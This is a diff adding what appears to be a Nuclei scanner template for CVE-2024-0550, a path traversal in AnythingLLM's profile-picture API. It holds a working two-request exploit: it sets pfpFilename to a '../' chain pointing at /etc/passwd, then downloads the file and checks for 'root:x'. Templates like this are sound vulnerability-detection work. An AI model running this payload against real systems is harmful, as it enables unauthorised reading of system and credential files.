@@ -1,0 +1,43 @@
+id: anythingllm-path-traversal
+
+info:
+  name: AnythingLLM Profile Picture Path Traversal
+  author: williwollo, byt3bl33d3r
+  severity: high
+  description: Path traversal vulnerability in AnythingLLM allows attackers to download any file from the system by manipulating the `pfpFilename` parameter.
+  reference:
+    - https://huntr.com/bounties/c6afeb5e-f211-4b3d-aa4b-6bad734217a6/
+  classification:
+    cvss-score: 9.6
+    cve-id: CVE-2024-0550
+    cwe-id: CWE-23
+  tags: path-traversal,anything-llm,cve,huntr,protectai
+
+# Update these accordingly
+variables:
+  token: ""
+  user_id: "3"
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/admin/user/{{user_id}}"
+    headers:
+      Authorization: Bearer {{token}}
+      Content-Type: text/plain;charset=UTF-8
+    body: | 
+      { 
+        "pfpFilename": "../../../../../../etc/passwd" 
+      }
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/system/pfp/{{user_id}}"
+    headers:
+      Authorization: Bearer {{token}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "root:x"
+        part: body
